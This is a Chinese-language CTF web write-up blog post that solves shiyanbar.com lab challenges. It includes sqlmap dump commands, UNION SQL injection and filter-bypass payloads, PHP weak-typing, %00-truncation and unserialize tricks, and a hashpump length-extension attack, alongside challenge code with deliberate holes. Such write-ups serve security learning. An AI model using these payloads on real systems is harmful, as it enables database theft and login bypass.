<h3 id="看起来有点难"><a href="#看起来有点难" class="headerlink" title="看起来有点难"></a>看起来有点难</h3><p><a href="http://ctf5.shiyanbar.com/basic/inject" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject</a> </p>
<p>注库名<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login</a>“ –dbs </p>
<p>回显</p>
<p>available databases [2]:<br>[<em>] information_schema<br>[</em>] test<br>注表名</p>
<p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login</a>“ -D “test” –tables –level 5<br>回显</p>
<p>Database: test<br>[1 table]<br>+——-+<br>| admin |<br>+——-+<br>注字段名</p>
<p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login</a>“ -D “test” -T “admin” –columns –level 5<br>回显</p>
<p>Database: test<br>Table: admin<br>[2 columns]<br>+———-+————–+<br>| Column   | Type         |<br>+———-+————–+<br>| password | varchar(100) |<br>| username | varchar(100) |<br>+———-+————–+<br>直接注密码内容</p>
<p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login</a>“ -D “test” -T “admin” -C “password” –dump –level 5<br>回显</p>
<p>Database: test<br>Table: admin<br>[1 entry]<br>+———-+<br>| password |<br>+———-+<br>| idnuenna |<br>+———-+<br>直接登录即可获得flag，</p>
<p>账号 admin 密码 idnuenna<br>获得key</p>
<p>恭喜你密码正确！ KEY :!@#WwwN5f0cu5coM</p>
<h3 id="猫抓老鼠"><a href="#猫抓老鼠" class="headerlink" title="猫抓老鼠"></a>猫抓老鼠</h3><p>Content-Row:响应头内容<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181759_121.png" alt=""><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181800_592.png" alt=""></p>
<h3 id="头有点大"><a href="#头有点大" class="headerlink" title="头有点大"></a>头有点大</h3><p><a href="http://ctf5.shiyanbar.com/sHeader/" target="_blank" rel="external">http://ctf5.shiyanbar.com/sHeader/</a><br>进入之后给了提示,需要满足三个条件</p>
<ol>
<li>安装 .NET 9.9</li>
<li>使用IE浏览器访问</li>
<li>要在英国<br>根据提示和题目名称呢，可以判断要修改http头</li>
</ol>
<p>于是乎构造</p>
<p>User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/5.0) .NET CLR 9.9<br>Accept-Language: en-gb;</p>
<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181805_551.png" alt=""></p>
<h3 id="这个看起来有点简单"><a href="#这个看起来有点简单" class="headerlink" title="这个看起来有点简单!"></a>这个看起来有点简单!</h3><p>Sqlmap -u “<a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/8/index.php?id=1</a>“ -D my_db –tables<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181824_480.png" alt=""><br>sqlmap.py -u “<a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/8/index.php?id=1</a>“ -D my_db -T thiskey –columns<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181824_242.png" alt=""></p>
<p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/8/index.php?id=1</a>“ -D my_db -T thiskey -C k0y –dump<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181825_659.png" alt=""><br> 爆字段得到key：whatiMyD91dump</p>
<p>方法二：<br>输入id=1 and 1=1 显示正常<br>输入id=1 and 1=2 回显错误<br>判断存在SQL注入漏洞（恩）<br>然后判断字段数<br>id=1 order by 1 可以，id=1 order by 2 可以，id=1 order by 3 不行！<br>所以字段数位2<br>id=1 union select 1 错误，id=1 union select 1,2 可以<br>所以字段数位2<br>然后开始爆数据库<br>id=1 union select 1,schema_name from information_schema.schemata</p>
<p>我们看到爆出了三个库：information_schema、my_db、test</p>
<p>接下来就是爆my_db的表名(就这个库名比较特别，就它了)<br>id=1 union select 1,table_name from information_schema.tables where table_schema=’my_db’</p>
<p>在my_db库里面爆出了两个表：news、thiskey<br>对了，thiskey在这里，然后就尝试爆列名</p>
<p>id=1 union select 1,column_name from information_schema.columns where table_schema=’my_db’</p>
<p>应该就是k0y了，试试看</p>
<p>id=1 union select 1,k0y from thiskey</p>
<h3 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h3><pre><code>&lt;?php
if(eregi(&quot;hackerDJ&quot;,$_GET[id])) {
  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == &quot;hackerDJ&quot;)
{
  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;
  echo &quot;&lt;p&gt;flag: *****************} &lt;/p&gt;&quot;;
}
?&gt;


&lt;br&gt;&lt;br&gt;
Can you authenticate to this website?
</code></pre><p>要将hackerDJ进行两次url编码才可满足两个条件</p>
<p>hackerDJ</p>
<p>%68%61%63%6B%65%72%44%4A</p>
<p>%2568%2561%2563%256B%2565%2572%2544%254A<br>提交即可获得flag</p>
<p><a href="http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568%2561%2563%256B%2565%2572%2544%254A" target="_blank" rel="external">http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568%2561%2563%256B%2565%2572%2544%254A</a><br>回显<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181831_78.png" alt=""></p>
<p>flag: DUTCTF{PHP_is_the_best_program_language}</p>
<h3 id="what-a-fuck-这是什么鬼东西"><a href="#what-a-fuck-这是什么鬼东西" class="headerlink" title="what a fuck!这是什么鬼东西?"></a>what a fuck!这是什么鬼东西?</h3><p>直接复制到浏览器的console运行即可<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181833_337.png" alt=""></p>
<h3 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h3><pre><code>//$_POST[user]意思是读取用户在提交表单时输入的user值，$_POST[PASS]同理
//如果二者的值都不为空
if($_POST[user] &amp;&amp; $_POST[pass]) {
    //连接数据库
    $conn = mysql_connect(&quot;********&quot;, &quot;*****&quot;, &quot;********&quot;);
    //选择数据库，如果出错，打印错误信息并终止代码运行
    mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;);
    if ($conn-&gt;connect_error) {
        die(&quot;Connection failed: &quot; . mysql_error($conn));
} 
//将用户输入的user值存储到user变量
$user = $_POST[user];
//将用户输入的pass值，使用md5 hash后，存入pass变量
$pass = md5($_POST[pass]);

//从表php中查找pw的值
//后半句的意思是：只保留user值为$user那一行的查找结果 
$sql = &quot;select pw from php where user=&#39;$user&#39;&quot;;

//查询语句的运行结果存入变量query之中
$query = mysql_query($sql);

//如果找不到，报错并终止
if (!$query) {
    printf(&quot;Error: %s\n&quot;, mysql_error($conn));
    exit();
}

//提取出query的值并以MYSQL_ASSOC格式存放在row之中
$row = mysql_fetch_array($query, MYSQL_ASSOC);
//echo $row[&quot;pw&quot;];

//如果row[pw]的值存在，且pass的值与row[pw]相同，则返回key
//strcasecmp是比较两个值大小，返回：-1,0,1
  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) {
    echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;
}
//否则返回登录失败
else {
    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);
  }
}
</code></pre><p>这里pass的值是 用户提交的密码经过MD5hash之后的值 如果二者相同则拿到 key</p>
<p>找输入输出</p>
<p>user一项的输出在php代码中如下： $sql = “select pw from php where user=’$user’”; 看起来并未对输入进行过滤，我们试着打入引号，果然报错，证明注入点可用！</p>
<p>分析</p>
<p>此时用工具打表的话，意义不大，因为此题目标已经明晰，我们只要让row[pw]的值与pass经过md5之后的值相等即可。 而$pass经过md5之后的值是我们可以通过正常输入控制的。 同时，row[pw]的值是从$sql提取出来的 因此，目标就一句话：只要我们能够修改$sql的值，此题解决。 再次审视注入点：$sql = “select pw from php where user=’$user’”; 在这里我们可以利用sql语句，直接给$sql返回一个值。 也就是说，不需要访问题里的数据库，只要我们修改了$sql的值，此题解决.</p>
<p>构造</p>
<p>最终user的框里输入的内容为： ‘AND 0=1 UNION SELECT “c4ca4238a0b923820dcc509a6f75849b” #</p>
<p>最前面的单引号：闭合原文的where user=’<br>AND 0=1:为了使前面的表达式返回值为空 从而使select pw from php where user=’’ AND 0=1这句话完全没用<br>接着我们使用UNION SELECT “c4ca4238a0b923820dcc509a6f75849b”，直接把MD5值作为返回值retuen给$sql<br>c4ca4238a0b923820dcc509a6f75849b这串MD5值是数字1经过MD5 hash之后的结果<br>最后的#用来注释掉后面没用的东西<br>最终，将’AND 0=1 UNION SELECT “c4ca4238a0b923820dcc509a6f75849b” #输入到user框里，将数字1输入到pass框里，登录成功。<br>或者user=’and 1=0 union select md5(1) #&amp;pass=1<br>key：SimCTF{youhaocongming}<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803192336_939.png" alt=""></p>
<h3 id="NSCTF-web200"><a href="#NSCTF-web200" class="headerlink" title="NSCTF web200"></a>NSCTF web200</h3><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803192339_352.png" alt=""></p>
<p>方法一：</p>
<pre><code>&lt;?php  
    $_code = &quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;  
    $_code = str_rot13($_code);  
    $_code = strrev($_code);  
    $_code = base64_decode($_code);  
    //echo $_code;  
    $_ans = &quot;&quot;;  
    for($x = 0; $x &lt; strlen($_code); $x++) {  
        $t = substr($_code, $x, 1);  
        $t1 = ord($t) - 1;  
        $t = chr($t1);  
        $_ans = $_ans . $t;  
    }  
    $_ans = strrev($_ans);  
    echo $_ans;  
?&gt;
</code></pre><p>方法二：</p>
<pre><code>&lt;?php

$str=&#39;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#39;;

$_out=&#39;&#39;;

$_in= base64_decode (strrev(str_rot13 ($str)));

        for($_start=0;$_start&lt;strlen($_in);$_start++){

                $_c=substr($_in,$_start,1);

                $__=ord($_c)-1;

                $_c=chr($__);

                $_out=$_out.$_c;

        }

    echo strrev($_out);

?&gt;
</code></pre><h3 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h3><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803200102_440.png" alt=""><br>burp抓包，修改为 uploads/1.php .jpg<br>转到hex编码，将空格20，改为00<br>00截断<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803200104_758.png" alt=""></p>
<h3 id="FALSE"><a href="#FALSE" class="headerlink" title="FALSE"></a>FALSE</h3><p>PHP代码审计<br>hint：sha1函数你有认真了解过吗？听说也有人用md5碰撞o(╯□╰)o<br>解题链接： <a href="http://ctf5.shiyanbar.com/web/false.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/false.php</a> </p>
<pre><code>&lt;?php
if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;])) {
    if ($_GET[&#39;name&#39;] == $_GET[&#39;password&#39;])
        echo &#39;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#39;;
    else if (sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;]))
      die(&#39;Flag: &#39;.$flag);
    else
        echo &#39;&lt;p&gt;Invalid password.&lt;/p&gt;&#39;;
}
else{
    echo &#39;&lt;p&gt;Login first!&lt;/p&gt;&#39;;
?&gt;
</code></pre><p>get获得参数name和passowrd，要获得flag，就要让两个参数不相等，但是两个参数的sha1()相等。<br>此处考察了一个知识点，MD5，sha1等hash函数在对数组进行加密的时候会返回FALSE，<br>这里可以运用数组绕过，sha1的参数必须为字符串，如果为其他的类型，则会直接返回FLASE，让两个参数都为数组的形式，就可以FALSE===FALSE，输出flag。当我们传入name[]=1&amp;password[]=2时，会造成<code>sha1(Array) === sha1(Array)</code>，即<code>NULL===NULL</code>，从而吐出flag</p>
<p>?name[]=1&amp;password[]=2<br>Flag: CTF{t3st_th3_Sha1}</p>
<h3 id="Guess-Next"><a href="#Guess-Next" class="headerlink" title="Guess Next"></a>Guess Next</h3><p>写个算法没准就算出来了，23333<br>hint：你确定你有认真看判断条件？</p>
<p>解题链接： <a href="http://ctf5.shiyanbar.com/web/Session.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/Session.php</a>  </p>
<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803200117_574.png" alt=""><br>burpsuite抓包，将phpsessid置空，并get参数password为空就行。。<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803200118_840.png" alt=""><br> CTF{Cl3ar_th3_S3ss1on}</p>
<h3 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h3><p>啊拉？又是php审计。已经想吐了。<br>hint：ereg()函数有漏洞哩；从小老师就说要用科学的方法来算数。<br>解题链接： <a href="http://ctf5.shiyanbar.com/web/more.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/more.php</a> </p>
<pre><code>&lt;?php
if (isset ($_GET[&#39;password&#39;])) {
    if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE)
    {
        echo &#39;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#39;;
    }
    else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)
    {
        if (strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !== FALSE)
        {
            die(&#39;Flag: &#39; . $flag);
        }
        else
        {
            echo(&#39;&lt;p&gt;*-* have not been found&lt;/p&gt;&#39;);
        }
    }
    else
    {
        echo &#39;&lt;p&gt;Invalid password&lt;/p&gt;&#39;;
    }
}
?&gt;
</code></pre><p>1.ereg漏洞：首先第一层检查需要绕过ereg漏洞，百度可以知道存在截断的问题，ereg读到%00的时候，就截止了</p>
<p>2.strlen()限制了长度小于8并且大小必须大于9999999,1e8=100000000 &gt; 9999999</p>
<p>3.strpos()对password进行匹配，必须含有-，最终才输出flag</p>
<p>于是构造?password=1e9%00<em>-</em></p>
<p>Flag: CTF{Ch3ck_anD_Ch3ck}</p>
<blockquote>
<p><a href="http://blog.csdn.net/qq_31481187/article/details/60968595" target="_blank" rel="external">http://blog.csdn.net/qq_31481187/article/details/60968595</a></p>
</blockquote>
<h3 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h3><p>找回密码<br>格式：SimCTF{ }<br>解题链接： <a href="http://ctf5.shiyanbar.com/10/upload/" target="_blank" rel="external">http://ctf5.shiyanbar.com/10/upload/</a> </p>
<p>进入网站step1.php，查看源代码，发现一句<meta name="editor" content="Vim"></p>
<p>vim编辑，可能存在.xxxx.php.swp的备份文件。尝试了.step1.php.swp、.step2.php.swp，都是404，查看step2.php的源码，发现有一个Submit.php，直接访问，提示you are not an admin，访问.submit.php.swp，果然存在，源码如下</p>
<pre><code>if(!empty($token)&amp;&amp;!empty($emailAddress)){
    if(strlen($token)!=10) die(&#39;fail&#39;);
    if($token!=&#39;0&#39;) die(&#39;fail&#39;);
    $sql = &quot;SELECT count(*) as num from `user` where token=&#39;$token&#39; AND email=&#39;$emailAddress&#39;&quot;;
    $r = mysql_query($sql) or die(&#39;db error&#39;);
    $r = mysql_fetch_assoc($r);
    $r = $r[&#39;num&#39;];
    if($r&gt;0){
        echo $flag;
    }else{
        echo &quot;you are not an admin&quot;;
    }
}
</code></pre><p>邮箱为admin的邮箱，要求token长度为10，且token需要等于零。</p>
<p>邮箱在step1.php中有提到<meta name="admin" content="admin@simplexue.com"></p>
<p>token验证可以用php中的0exxxxxxxx绕过。</p>
<p>payload：?emailAddress=admin@simplexue.com&amp;token=0e11111111</p>
<p>flag：SimCTF{huachuan_TdsWX}</p>
<h3 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h3><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803200134_866.png" alt=""><br>让username的MD5和0相等，可以让MD5以0e开头。<br><a href="http://www.cnblogs.com/Primzahl/p/6018158.html" target="_blank" rel="external">PHP处理0e开头md5哈希字符串缺陷/bug</a></p>
<p>username输入QNKCDZO，得到/user.php?fame=hjkleffifer，访问页面看到一段php源码。</p>
<pre><code>$unserialize_str = $_POST[&#39;password&#39;]; 
$data_unserialize = unserialize($unserialize_str); 
if($data_unserialize[&#39;user&#39;] == &#39;???&#39; &amp;&amp; $data_unserialize[&#39;pass&#39;]==&#39;???&#39;) 
{  
  print_r($flag); 
}
</code></pre><p>这段php将post的password值进行了反序列化，得到了一个数组，将数组的user和pass的值和???进行了比较。比较用到了php的弱类型，bool类型的true跟任意字符串可以弱类型相等<br>因此我们可以构造bool类型的序列化数据 ，无论比较的值是什么，结果都为true。（a代表array，s代表string，b代表bool，而数字代表个数/长度）<br>payload:post：a:2:{s:4:”user”;b:1;s:4:”pass”;b:1;}</p>
<p>flag:ctf{dwduwkhduw5465}</p>
<h3 id="Forms-1"><a href="#Forms-1" class="headerlink" title="Forms"></a>Forms</h3><p>查看网页源代码。</p>
<pre><code>&lt;input type=&quot;hidden&quot; name=&quot;showsource&quot; value=0&gt;
</code></pre><p>将type中的hidden去掉，并赋值value=1，提交，就能看到源代码了。</p>
<pre><code>$a = $_POST[&quot;PIN&quot;];
if ($a == -19827747736161128312837161661727773716166727272616149001823847) {
    echo &quot;Congratulations! The flag is $flag&quot;;
} else {
    echo &quot;User with provided PIN not found.&quot;; 
}
</code></pre><p>让a等于对应的数字，就能得到flag。</p>
<p>flag：ctf{forms_are_easy}</p>
<h3 id="拐弯抹角"><a href="#拐弯抹角" class="headerlink" title="拐弯抹角"></a>拐弯抹角</h3><p>题目的意思就是通过改变地址栏访问index.php，但是限制了条件不能使用 ./  ../ \ 而且只能使用小写字母，不可以在php后加点，这里我们可以利用伪静态技术，使用<a href="http://ctf5.shiyanbar.com/indirection/index.php/index.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/indirection/index.php/index.php</a><br>index.php后的index.php会被当做参数处理，所以服务器只会解析第一个index.php，满足条件成功绕过。</p>
<p>URL重写，其实就是把带一大堆参数的url，变成一个看上去很规矩的url,主要目的是为了搜索引擎。</p>
<h3 id="让我进去"><a href="#让我进去" class="headerlink" title="让我进去"></a>让我进去</h3><p>先用burpsuite抓包，发现setcookie中有source=0，在cookie中赋值，将其改为1，得到源代码。<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201255_194.png" alt=""></p>
<pre><code>$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;
$secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!
$username = $_POST[&quot;username&quot;];
$password = $_POST[&quot;password&quot;];
if (!empty($_COOKIE[&quot;getmein&quot;])) {
    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) {
        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {
            echo &quot;Congratulations! You are a registered user.\n&quot;;
            die (&quot;The flag is &quot;. $flag);
        }
        else {
            die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);
        }
    }
    else {
        die (&quot;You are not an admin! LEAVE.&quot;);
    }
}
setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));
if (empty($_COOKIE[&quot;source&quot;])) {
    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));
}
else {
    if ($_COOKIE[&quot;source&quot;] != 0) {
        echo &quot;&quot;; // This source code is outputted here
    }
}
</code></pre><p>samlpe-hash是15位的secret+adminadmin的md5值，要获得flag，要让cookie中的getmein值等于secret+username+password的md5值，password又不能等于admin，所以要利用哈希扩展攻击，这里直接用的hashpump工具。</p>
<pre><code>hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d admin -k 20 -a admin
</code></pre><p>输出结果</p>
<pre><code>e18dfd8404515016d3aeeea2aa196909
admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00admin
</code></pre><p>将\x换成%并填入对应位置。<br>hash2</p>
<p>flag：CTF{cOOkieS_4nd_hAshIng_G0_w3LL_t0g3ther}</p>
<p>打开网页，查看源代码，获得提示<!-- please post what you find with parameter:key -->，让我们post参数key。</p>
<p>抓包发现header头中有经过base64编码的flag参数，<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803200157_179.png" alt=""><br>将参数解码P0ST_THIS_T0_CH4NGE_FL4G:9x3PyMMd9，将参数9x3PyMMd9post却没有结果，题目中说尽快的提交，猜测与时间有关，用python脚本解</p>
<pre><code>import requests,re
from base64 import b64decode
s = requests.Session()
url = &#39;http://ctf5.shiyanbar.com/web/10/10.php&#39;
r = s.get(url)
head = r.headers
flag = b64decode(head[&#39;flag&#39;]).split(&#39;:&#39;)[1]
r1 = s.post(url, data={&#39;key&#39;:flag})
print r1.text
</code></pre><h3 id="简单的sql注入"><a href="#简单的sql注入" class="headerlink" title="简单的sql注入"></a>简单的sql注入</h3><p>1.判断<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201346_982.png" alt=""><br>2.判断过滤<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1 and 1=1<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201347_373.png" alt=""></p>
<blockquote>
<p>过滤空格方法</p>
<ol>
<li>注释/<strong>/绕过空格     select user() from d     变成`select/</strong>/user()/<strong>/from/</strong>/`</li>
<li>括号绕过空格     select user() from dual where 1=1 and 2=2     变成     select(user())from dual where(1=1)and(2=2)</li>
<li>使用符号替代空格 %20 %09 %0d %0b %0c %0d %a0 %0a</li>
</ol>
</blockquote>
<pre><code>对页面输入下面的测试项测试过滤规则

测试项    输入    是否过滤
逗号    ,&#39;    否
注释符#    #&#39;    是
注释符 --    --&#39;    是
注释符/**/    /**/&#39;    否
updatexml函数    updatexml &#39;    否
select    select&#39;    否
select    select &#39;    是
select    select/**/&#39;    否
select    /*!select*/    否
or    or&#39;    否
and    and&#39;    否
concat    concat &#39;    否
group_concat    group_concat&#39;    是
group_concat    /*groupt_concat*/&#39;    是
group_concat    groupgroup_concat_concat&#39;    否
</code></pre><p>3.判断有那些数据库：</p>
<pre><code>http://ctf5.shiyanbar.com/423/web/
?id=1&#39;/**/union/**/select/**/schema_name/**/from/**/information_schema.schemata/**/where/**/&#39;1&#39;=&#39;1
</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201407_844.png" alt=""></p>
<ol>
<li>查看有哪些数据表：<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’/<strong>/union/</strong>/select/<strong>/table_name/</strong>/from/<strong>/information_schema.tables/</strong>/where/<strong>/‘1’=’1<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201415_889.png" alt=""><br> 发现了flag的表，我们猜测应该是在web1数据库中并且字段就是flag（其实就在本页面的数据库中）<br>故：<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’/</strong>/union/<strong>/select/</strong>/flag/<strong>/from/</strong>/web1.flag/<strong>/where/</strong>/‘1’=’1<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201419_771.png" alt=""><br>方法二：<br>双空格双查询<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’  unionunion  selectselect  flag  fromfrom  flag  wherewhere ‘1’=’1</li>
</ol>
<p>###简单的sql注入之2<br>用?id=1 and 1=1测试，返回SQLi detected!，这是过滤了and？又尝试了很多关键字，都返回SQLi detected!，那可能是过滤了空格。<br>绕过空格<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201422_573.png" alt=""><br>payload</p>
<pre><code>http://ctf5.shiyanbar.com/web/index_2.php/?id=1&#39;/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&#39;1&#39;=&#39;1
</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201437_337.png" alt=""></p>
<h3 id="简单的sql注入之3"><a href="#简单的sql注入之3" class="headerlink" title="简单的sql注入之3"></a>简单的sql注入之3</h3><p>注库名</p>
<pre><code>sqlmap -u &quot;http://ctf5.shiyanbar.com/web/index_3.php?id=1&quot; --dbs
</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201444_689.png" alt=""></p>
<p>当前数据库<br>Sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php/?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php/?id=1</a>“ –current-db</p>
<p>注表名<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>“ -D “web1” –tables<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201453_629.png" alt=""></p>
<p>注字段<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>“ -D “web1” -T “flag” –columns<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201457_156.png" alt=""><br>注内容<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=123" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=123</a>“ -D “web1” -T “flag” -C “flag” –dump<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201517_635.png" alt=""></p>
<p>flag{Y0u_@r3_5O_dAmn_90Od}</p>
<h3 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h3><p><a href="http://ctf5.shiyanbar.com/web/pcat/source.txt" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/pcat/source.txt</a></p>
<pre><code>&lt;?php
error_reporting(0);
if (!isset($_POST[&#39;uname&#39;]) || !isset($_POST[&#39;pwd&#39;])) {
  echo &#39;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#39;.&quot;&lt;br/&gt;&quot;;
  echo &#39;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&#39;.&quot;&lt;br/&gt;&quot;;
  echo &#39;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&#39;.&quot;&lt;br/&gt;&quot;;
  echo &#39;&lt;input type=&quot;submit&quot; /&gt;&#39;.&quot;&lt;br/&gt;&quot;;
  echo &#39;&lt;/form&gt;&#39;.&quot;&lt;br/&gt;&quot;;
  echo &#39;&lt;!--source: source.txt--&gt;&#39;.&quot;&lt;br/&gt;&quot;;
    die;
}
function AttackFilter($StrKey,$StrValue,$ArrReq){  
    if (is_array($StrValue)){
        $StrValue=implode($StrValue);
    }
    if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1){   
        print &quot;水可载舟，亦可赛艇！&quot;;
        exit();
    }
}
$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;
foreach($_POST as $key=&gt;$value){ 
    AttackFilter($key,$value,$filter);
}
$con = mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);
if (!$con){
  die(&#39;Could not connect: &#39; . mysql_error());
}
$db=&quot;XXXXXX&quot;;
mysql_select_db($db, $con);
$sql=&quot;SELECT * FROM interest WHERE uname = &#39;{$_POST[&#39;uname&#39;]}&#39;&quot;;
$query = mysql_query($sql); 
if (mysql_num_rows($query) == 1) { 
    $key = mysql_fetch_array($query);
    if($key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]) {
        print &quot;CTF{XXXXXX}&quot;;
    }else{
        print &quot;亦可赛艇！&quot;;
    }
}else{
  print &quot;一颗赛艇！&quot;;
}
mysql_close($con);
?&gt;
